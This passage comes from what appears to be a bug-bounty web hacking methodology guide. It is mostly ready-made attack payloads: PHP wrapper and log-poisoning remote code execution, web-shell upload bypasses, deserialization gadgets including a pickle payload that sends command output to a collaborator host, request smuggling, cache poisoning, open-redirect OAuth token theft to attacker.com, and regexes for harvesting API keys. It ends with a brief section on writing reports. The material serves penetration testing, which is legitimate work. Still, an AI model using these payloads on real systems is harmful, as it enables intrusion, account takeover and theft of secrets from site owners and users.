curl -X POST --data "<?php system('id'); ?>" "https://target.com/page.php?file=php://input"

# data:// — RCE
# URL: /page.php?file=data://text/plain,<?php system('id'); ?>
# URL: /page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# expect:// — RCE (if expect module loaded)
expect://id
expect://whoami

# zip:// — RCE via uploaded zip
# Upload zip containing shell.php → /page.php?file=zip://uploads/shell.zip%23shell.php
# %23 = # character

# phar:// — RCE via phar deserialization
phar://shell.zip/shell.php
```

**Log Poisoning → RCE**
```bash
# Apache access.log poisoning
# Inject PHP payload in User-Agent
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" https://target.com/
# Then: /page.php?file=/var/log/apache2/access.log&c=id

# Other paths:
/var/log/nginx/access.log
/var/log/httpd/access_log
/var/log/apache/access.log
/opt/lampp/logs/access_log

# SSH auth log poisoning
ssh "<?php system('id'); ?>"@target.com
# Then: /page.php?file=/var/log/auth.log

# Email log poisoning
# Send email to target@target.com with subject: <?php system('id'); ?>
# Then: /page.php?file=/var/mail/www-data

# /proc/self/environ — if User-Agent is reflected
curl -H "User-Agent: <?php system('id'); ?>" "https://target.com/page.php?file=/proc/self/environ"
```

**Windows Targets**
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
..\..\..\..\..\windows\win.ini
/../../../../../windows/win.ini
```

---

### **4.10 File Upload Vulnerabilities**

**🛠️ Tools:** [fuxploider](https://github.com/almandin/fuxploider), Burp Suite

**10 Extension Bypass Techniques**
```bash
# 1. Double extension
shell.php.jpg
shell.php;.jpg       # Unicode semicolon bypass
shell.php%00.jpg     # Null byte
shell.php .jpg       # Trailing space (Windows strips it)
shell.pHp            # Case variation
shell.PHP            # Uppercase
shell.php5           # Alternative PHP extension
shell.phtml          # Alternative PHP extension
shell.pht            # Rare PHP extension
shell.phar           # PHP archive (RCE possible)
shell.shtml          # SSI enabled
shell.php.jpg.php    # Nested double extension
shell.asp;.jpg       # IIS extension bypass
shell.aspx;.jpg

# 2. .htaccess upload — enable PHP in any extension
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png

# 3. web.config (IIS) — execute with different handler
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP_as_JPG" path="*.jpg" verb="*" modules="FastCgiModule" 
           scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Either" />
    </handlers>
  </system.webServer>
</configuration>
```

**Content-Type & Magic Bytes Bypass**
```bash
# GIF header + PHP payload
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
# filename: shell.php, Content-Type: image/gif

# PNG magic bytes
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php

# JPEG EXIF injection (valid image + PHP in metadata)
exiftool -Comment="<?php system(\$_GET['c']); ?>" image.jpg -o shell.jpg.php

# JPEG polyglot (renders as real image AND executes as PHP)
# Requires careful construction with JPEG header preservation
```

**SVG Attacks**
```xml
<!-- SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

<!-- SVG SSRF/XXE (see 4.8) -->
```

**ZIP Slip — Path Traversal in Archive**
```bash
# Create malicious archive
ln -s /etc/passwd etc_passwd
zip --symlinks archive.zip etc_passwd
# In archive: etc/passwd -> ../../../../tmp/pwned → writes outside extraction dir
```

**Automated**
```bash
python3 fuxploider.py --url https://target.com/upload --not-regex "error|invalid|denied"
```

---

### **4.11 Insecure Deserialization**

**🛠️ Tools:** [ysoserial](https://github.com/frohoff/ysoserial), [phpggc](https://github.com/ambionics/phpggc), [ysoserial.NET](https://github.com/pwntester/ysoserial.net)

**Fingerprint Encoded Data**
```bash
# Java serialized objects
# Base64: rO0AB...  Hex: aced0005...
echo "rO0AB..." | base64 -d | xxd | head

# PHP serialized
# Pattern: O:classname_length:"classname":property_count:{...}
# O:8:"User":2:{s:4:"name";s:4:"John";s:5:"admin";b:0;}

# Python pickle
# Base64 starts with: gASV... (. = \x80\x04\x95)
# Text starts with: (dp0\nS'key'\np1\n

# .NET BinaryFormatter
# Base64: AAEA... / Hex: 0001...

# Ruby Marshal
# Base64: BAhlOg... / Hex: 04086f3a...

# YAML
# !!python/object:apply:os.system ['id']
```

**Exploitation**
```bash
# === Java ===
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-COLLABORATOR.oastify.com' | base64 -w0
# Common gadget chains: CommonsCollections1-7, Groovy1, Spring1, Jdk7u21, URLDNS

# === PHP ===
# List available gadgets
phpggc -l
# Generate RCE payload
phpggc Laravel/RCE1 system 'id' | base64
phpggc Symfony/RCE4 system 'id' | base64
phpggc Monolog/RCE1 system 'id' | base64
phpggc Guzzle/FW1 system 'id' | base64

# === Python pickle ===
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://YOUR-COLLABORATOR.oastify.com?x=$(id|base64)',))
print(base64.b64encode(pickle.dumps(RCE())).decode())

# === Python YAML (PyYAML < 5.1) ===
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.Popen ['id']

# === Node.js (node-serialize) ===
# Base64 of: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}"}

# === Ruby (Marshal) ===
# Use https://github.com/dreadlocked/marshalsec or universal_rce.rb
```

**Common Injection Points**
```bash
# Cookies, hidden form fields, API bodies, JWT payloads
# Look for base64 data that decodes to serialized formats
cat parameters.txt | qsreplace "test" | while read url; do
  curl -s -b "session=rO0AB..." "$url"  # Java test
done
```

---

### **4.12 Prototype Pollution**

**🛠️ Tools:** DOM Invader (Burp), [ppfuzz](https://github.com/dwisiswant0/ppfuzz)

**Client-Side Detection**
```bash
# Inject into query params or JSON body
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor[prototype][polluted]=true
?__proto__[data][isAdmin]=true

# Check in browser console:
Object.prototype.polluted  # should be true
```

**Common Gadgets & Scenarios**
```javascript
// == Server-side (Node.js) ==
// lodash _.merge / _.defaultsDeep
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}

// Child_process RCE via polluted options
{"__proto__":{"shell":"/bin/sh","env":{"NODE_OPTIONS":"--require=/tmp/evil.js"}}}

// Express trust proxy pollution
{"__proto__":{"remoteAddress":"127.0.0.1"}}

// == Client-side ==
// jQuery $.extend
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}

// Skipper body-parser
{"constructor.prototype.allowPrototypePollution":true}
```

**JSON Merge Endpoint Attack**
```bash
PUT /api/user/settings
Content-Type: application/json

{"__proto__":{"role":"admin","isAdmin":true,"verified":true}}
```

---

### **4.13 HTTP Request Smuggling**

**🛠️ Tools:** [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) (Burp), [smuggler.py](https://github.com/defparam/smuggler), [h2csmuggler](https://github.com/BishopFox/h2csmuggler)

**CL.TE (Frontend: CL, Backend: TE)**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
*Frontend sends full body (6 bytes: "0\r\n\r\nG"), Backend sees chunked "0" (terminator) then the next request starts with "G"*

**TE.CL (Frontend: TE, Backend: CL)**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**H2.CL (HTTP/2 downgrade to HTTP/1.1)**
```bash
# Use Burp to send HTTP/2 request with smuggled Content-Length
# Frontend is HTTP/2, downgrades to HTTP/1.1 to backend
# Inject Content-Length: 0 header → backend waits for more body
```

**TE.TE Obfuscation — Confuse the parser**
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding:	chunked     # Tab before chunked
Transfer-Encoding:\x0bchunked    # Vertical tab
```

**Smuggling → Critical Impact**
```bash
# 1. Cache poisoning — smuggle host header → cached for all users
# 2. Credential hijacking — smuggle request that captures next user's session
# 3. WAF bypass — smuggle directly to backend, bypassing WAF
# 4. Internal header injection (X-Forwarded-For, X-Real-IP)
```

**Detection**
```bash
python3 smuggler.py -u https://target.com
# Time-based confirmation: if smuggled delayed request affects victim request timing
```

---

### **4.14 Web Cache Poisoning & Deception**

**🛠️ Tools:** [Param Miner](https://github.com/PortSwigger/param-miner) (Burp)

**Unkeyed Header Injection — Poison the Cache**
```bash
# If these headers are NOT part of the cache key but ARE reflected:
X-Forwarded-Host: evil.com       # Poisoned: redirects, script src, stylesheet href
X-Forwarded-Scheme: http         # Poisoned: redirect to http version
X-Forwarded-Port: 80             # Poisoned: 301 redirect
X-Forwarded-For: 127.0.0.1       # Poisoned: IP-based logic
X-Original-URL: /admin           # Poisoned: WAF bypass
X-Rewrite-URL: /admin            # Poisoned: content from different path
X-HTTP-Method-Override: POST     # Poisoned: method confusion
Origin: evil.com                 # Poisoned: CORS ACAO header

# Cache key normalization bypass
GET /path..;/admin HTTP/1.1      # Parsed as /path but cached as /admin
GET /path%3B/admin HTTP/1.1
GET //path/../admin HTTP/1.1
```

**Web Cache Deception (WCD)**
```bash
# Attach fake static extension to sensitive URL
GET /account/profile.css HTTP/1.1
GET /api/me/orders.json HTTP/1.1
GET /settings/nonexistent.js HTTP/1.1

# If CDN caches the response as a static file...
# Attacker visits: https://target.com/account/profile.css → sees victim's profile
```

---

### **4.15 Race Conditions & TOCTOU**

**🛠️ Tools:** [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder) (Burp), [racepwn](https://github.com/racepwn/racepwn)

**Single-Packet Attack (HTTP/2)**
```python
# Turbo Intruder script — fire all requests in one TCP packet
def queueRequests(target, gateways):
    engine = RequestEngine(endpoint='https://target.com:443',
                           concurrentConnections=20,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gateways[i % 2])
    engine.openGate('1')
    engine.openGate('2')
```

**High-Value Race Targets**
```bash
# 1. Coupon/gift card double-spend
# Apply coupon N times in single packet before balance updates

# 2. OTP/MFA rate-limit bypass
# Send 20 OTP attempts simultaneously

# 3. Account creation race
# Register same email/username → one succeeds, check for duplicate

# 4. Vote/upvote inflation
# Submit N votes before counter increments

# 5. Password reset token race
# Generate reset → use old token → old token still valid window

# 6. File upload race
# Upload shell → request shell before deletion check

# 7. WebSocket race
# Send messages simultaneously to bypass ordering logic
```

**Race Condition Detection Heuristic**
```bash
# Any endpoint that does: read → check → write
# TOCTOU: Time Of Check ≠ Time Of Use
# Use Turbo Intruder's last-byte sync to exploit
```

---

### **4.16 Business Logic Flaws**

**Price & Payment Manipulation**
```bash
# Negative quantity → wallet top-up
POST /cart/add {"product_id": 1, "quantity": -1}  # Negative total

# Fractional quantity
POST /cart/add {"product_id": 1, "quantity": 0.0001}

# Price override in request
POST /checkout {"total": 0.01, "original_total": 999.99}
POST /checkout {"amount": 0, "currency": "VND"}    # 0 VND = free

# Parameter pollution — which price wins?
POST /checkout?price=1&price=999
```

**Coupon & Discount Abuse**
```bash
# Stacking: apply coupon, apply another, apply first again
POST /cart/apply-coupon {"code": "SAVE10"}
POST /cart/apply-coupon {"code": "SAVE10"}  # Apply twice!
POST /cart/apply-coupon {"code": "SAVE10","code": "SAVE20"}  # Apply both

# 100% off: create coupon if API allows
POST /api/admin/coupons {"code": "FREE100", "discount": 100, "max_uses": 999}

# Coupon on free items → collects credit
POST /checkout {"coupon": "SAVE10"}  # on $0 purchase → credits $10
```

**Subscription & Trial Abuse**
```bash
# Infinite trial
POST /subscribe {"trial": true, "trial_days": 999999}
POST /subscribe {"plan": "premium", "paid": false}

# Cancel during trial, keep access (check if access revoked)
```

**Workflow State Manipulation**
```bash
# Skip payment step
GET /checkout/success?order_id=123  # directly access success page

# Payment gateway callback manipulation
# Intercept or replay payment success callback

# Modify response from 3rd party
# If client-side payment validation: {"status": "paid"} → change to {"status": "success"}
```

**IDOR Chained → Business Logic Critical**
```bash
# IDOR to view other users' coupons → apply them
# IDOR to cancel other users' orders → steal inventory
```

---

### **4.17 Open Redirect**

**🛠️ Tools:** [Oralyzer](https://github.com/0xNanda/Oralyzer)

**Parameter Discovery**
```bash
cat urls.txt | grep -E "redirect=|url=|next=|return=|goto=|target=|dest=|forward=|continue=|to=|back=|redir=" | anew redirect_params.txt
```

**12 Bypass Techniques**
```bash
# 1. Double slash
//evil.com

# 2. Backslash
https:/\evil.com

# 3. @ confusion
https://target.com@evil.com

# 4. Hash fragment
https://evil.com%23.target.com

# 5. Unicode/IDN homograph
https://еvil.com  # Cyrillic 'е' (U+0435) looks like Latin 'e'

# 6. Known redirect chain
https://target.com/redirect?url=https://evil.com%40.target.com

# 7. Double encoding
%252f%252fevil.com

# 8. Subdomain control
# If target trusts *.target.com, get XSS on sub.target.com → redirect to sub.target.com

# 9. javascript: protocol
javascript:document.location='https://evil.com'

# 10. data: URL
data:text/html,<script>location='https://evil.com'</script>

# 11. CRLF injection → header-based redirect
%0d%0aLocation:%20https://evil.com

# 12. Parameter splitting
?redirect=https://target.com&redirect=https://evil.com
```

**OAuth Token Theft via Open Redirect**
```bash
# If OAuth provider accepts redirect_uri that chains to open redirect:
GET /oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/openredirect?url=https://attacker.com
# → auth code is sent to attacker.com
# → attacker exchanges code for access token → Account Takeover
```

---

### **4.18 Information Disclosure & Secret Leaks**

**🛠️ Tools:** [truffleHog](https://github.com/trufflesecurity/trufflehog), [git-dumper](https://github.com/arthaud/git-dumper), [SecretFinder](https://github.com/m4ll0k/SecretFinder)

**JS Secret Harvesting Regex**
```bash
cat js_files.txt | grep -oE "AKIA[0-9A-Z]{16}" | anew aws_keys.txt
cat js_files.txt | grep -oE "AIza[0-9A-Za-z\-_]{35}" | anew gcp_keys.txt
cat js_files.txt | grep -oE "ghp_[0-9a-zA-Z]{36}" | anew github_tokens.txt
cat js_files.txt | grep -oE "sk-[a-zA-Z0-9]{48}" | anew openai_keys.txt
cat js_files.txt | grep -oE "xox[baprs]-[a-zA-Z0-9-]+" | anew slack_tokens.txt
cat js_files.txt | grep -oE "sk_live_[0-9a-zA-Z]{24}" | anew stripe_keys.txt
cat js_files.txt | grep -oE "SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}" | anew sendgrid_keys.txt
cat js_files.txt | grep -oE "pk\.[a-zA-Z0-9_]{40,}" | anew paypal_keys.txt
cat js_files.txt | grep -oE "AKCp8[0-9a-zA-Z]{40,}" | anew jfrog_keys.txt
cat js_files.txt | grep -oE "ya29\.[0-9A-Za-z\-_]+" | anew google_oauth.txt
cat js_files.txt | grep -oE "(AC[a-f0-9]{32}|SK[a-f0-9]{32})" | anew twilio_keys.txt
cat js_files.txt | grep -oE "[a-zA-Z0-9+/]{40}" | anew generic_b64_secrets.txt
```

**Exposed Config & Source Files**
```bash
# Quick sweep
cat live_websites.txt | while read url; do
  for path in ".git/HEAD" ".env" ".env.local" ".env.production" "backup.zip" "wp-config.php.bak" "config.php.bak" ".DS_Store" "package.json" "composer.json" "Dockerfile" "docker-compose.yml" "robots.txt" "sitemap.xml" ".well-known/security.txt"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url/$path")
    [ "$status" != "404" ] && [ "$status" != "000" ] && echo "[$status] $url/$path"
  done
done

# .git directory dump → full source code
git-dumper https://target.com/.git/ ./target-git-dump/

# Source maps → reconstruct TypeScript/ES6
cat js_files.txt | grep "\.map$" | while read mapurl; do
  curl -s "$mapurl" | jq '.sources' -c 2>/dev/null | head -5
  echo "---"
done
```

**Endpoint Discovery from JS**
```bash
cat js_files.txt | grep -oE '"/[a-zA-Z0-9_/\-\.]+"' | sort -u | anew js_endpoints.txt
cat js_files.txt | grep -oE "/api/v[0-9]+/[a-zA-Z0-9_/\-]+" | sort -u | anew api_routes.txt
```

**Environment-Specific Leaks**
```bash
# Cross-origin API endpoint leaks
cat js_files.txt | grep -oE "https?://[a-zA-Z0-9\.\-]+/(api|graphql|v[0-9])/[^\"]+" | sort -u

# Hardcoded internal IPs
cat js_files.txt | grep -oE "10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | anew internal_ips.txt
cat js_files.txt | grep -oE "172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}" | anew internal_ips.txt
cat js_files.txt | grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" | anew internal_ips.txt
```

---

<br>


## **5. The "Two-Eye" Approach 👀**
1. **First Eye:** Focus on testing every gathered subdomain, endpoint, or parameter for common vulnerabilities.
2. **Second Eye:** Identify “interesting” findings like exposed credentials, forgotten subdomains, or admin panels.

### **Actionable Steps:**
- If a vulnerability is identified, create a proof of concept (POC) and test its impact.
- If no vulnerabilities are found, pivot to deeper testing on unique subdomains or endpoints.



---

<br>


## **6. Proof of Concept (POC) Creation**

### **🎥Video POC**

Demonstrate vulnerabilities in action using screen recording tools like Greenshot or OBS Studio.

### **📸Screenshot POC**

Capture clear screenshots with annotations to explain each step.

- **🛠️Tool:** Greenshot.


---

<br>


## **7. Reporting**

### **📝Report Structure**

1. **Executive Summary**
   - Target Scope
   - Testing Timeline
   - Key Findings Summary
   - Risk Ratings

2. **Technical Details**
   - Vulnerability Title
   - Severity Rating
   - Affected Components
   - Technical Description
   - Steps to Reproduce
   - Impact Analysis
   - Supporting Evidence (POC)

3. **Remediation**
   - Detailed Recommendations
   - Mitigation Steps
   - Additional Security Controls
   - References & Resources

4. **Supporting Materials**
   - Video Demonstrations
   - Screenshots & Annotations
   - HTTP Request/Response Logs
   - Code Snippets
   - Timeline of Discovery

### **Best Practices**

- Write clear, concise descriptions
- Include detailed reproduction steps
- Provide actionable remediation advice
- Support findings with evidence
- Use professional formatting
- Highlight business impact
- Include verification steps

### **Report Format**

```markdown
# Vulnerability Report: [Title]

## Overview
- Severity: [Critical/High/Medium/Low]
- CVSS Score: [Score]
- Affected Component: [Component]

## Description
[Detailed technical description]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step n...]

## Impact
[Business and technical impact]

## Proof of Concept
[Screenshots, videos, code]

## Recommendations
[Detailed fix recommendations]

## References
[CVE, CWE, related resources]
```

---

<br>


## 📄 License
MIT License — Hack responsibly. Share knowledge. Build the community.
